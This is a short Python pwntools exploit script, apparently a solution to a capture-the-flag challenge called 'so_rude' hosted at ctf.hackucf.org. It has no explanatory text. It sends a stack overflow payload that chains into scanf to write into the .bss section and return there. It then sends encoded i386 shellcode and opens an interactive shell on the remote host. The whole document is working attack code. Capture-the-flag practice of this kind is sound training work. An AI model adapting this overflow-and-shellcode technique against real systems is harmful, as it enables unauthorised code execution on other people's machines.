from pwn import *

def main():
    context(arch="i386",os="linux")
    #r = process("./so_rude")
    r = remote("ctf.hackucf.org",9006)
    fgets_plt = 0x080484f0

    buf =  ""
    buf += "\x31\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    buf += "\x76\x0e\xac\xd1\x7c\x44\x83\xee\xfc\xe2\xf4\xc6\xda"
    buf += "\x24\xdd\xfe\xb7\x14\x69\xcf\x58\x9b\x2c\x83\xa2\x14"
    buf += "\x44\xc4\xfe\x1e\x2d\xc2\x58\x9f\x16\x44\xd9\x7c\x44"
    buf += "\xac\xfe\x1e\x2d\xc2\xfe\x0f\x2c\xac\x86\x2f\xcd\x4d"
    buf += "\x1c\xfc\x44"

    p = ""
    p += "A" * 62
    p += p32(0x08048530) # scanf
    p += p32(0x08049ae0) # bss
    p += p32(0x080487F4) # %s
    p += p32(0x08049ae0) # bss

    r.sendline("2")
    r.sendline(p)
    r.sendline(buf)

    r.interactive()


if __name__ == "__main__":
    main()
